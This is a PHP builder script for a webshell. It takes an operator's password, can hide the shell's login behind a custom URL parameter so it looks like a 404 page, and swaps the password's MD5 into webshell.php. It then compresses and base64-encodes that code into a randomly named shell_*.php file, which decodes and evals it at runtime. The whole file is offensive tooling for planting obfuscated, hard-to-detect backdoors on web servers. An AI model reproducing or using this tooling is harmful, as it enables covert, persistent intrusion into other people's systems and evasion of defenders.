<?php
echo "Enter password for webshell: ";
$password = trim(fgets(STDIN));

echo "Hide Login Page? (y/n): ";
$enable_404 = strtolower(trim(fgets(STDIN))) === 'y';

//echo "Use login parameter? (y/n): ";
//$use_login_param = strtolower(trim(fgets(STDIN))) === 'y';

$login_param = 'login';
if ($enable_404) {
    echo "Enter custom login parameter (default: login): ";
    $custom_param = trim(fgets(STDIN));
    if (!empty($custom_param)) {
        $login_param = $custom_param;
    }
}

$password_md5 = md5($password);

$php_code = file_get_contents('webshell.php');

if (!$enable_404) {
    $php_code = str_replace('if (isset($_GET[\'login\'])) {', 'if (true) {', $php_code);
} else {
    $php_code = str_replace('if (isset($_GET[\'login\'])) {', 'if (isset($_GET[\'' . $login_param . '\'])) {', $php_code);
}

$php_code = str_replace('5f4dcc3b5aa765d61d8327deb882cf99', $password_md5, $php_code);

$compressed_code = gzdeflate($php_code);
$base64_code = base64_encode($compressed_code);

$output = "<?php\n\n";
$output .= "\$compressed_code = '" . $base64_code . "';\n\n";
$output .= "\$php_code = gzinflate(base64_decode(\$compressed_code));\n\n";
$output .= "eval(\"?>\".\$php_code);\n\n";
$output .= "?>";

$random_filename = uniqid('shell_') . '.php';
file_put_contents($random_filename, $output);

echo "Encoded file has been created successfully as: " . $random_filename . "\n";
echo "Password MD5: " . $password_md5 . "\n";
echo "Login Page: " . ($enable_404 ? "Hidden (Parameter: " . $login_param . ")" : "Visible") . "\n";
?>
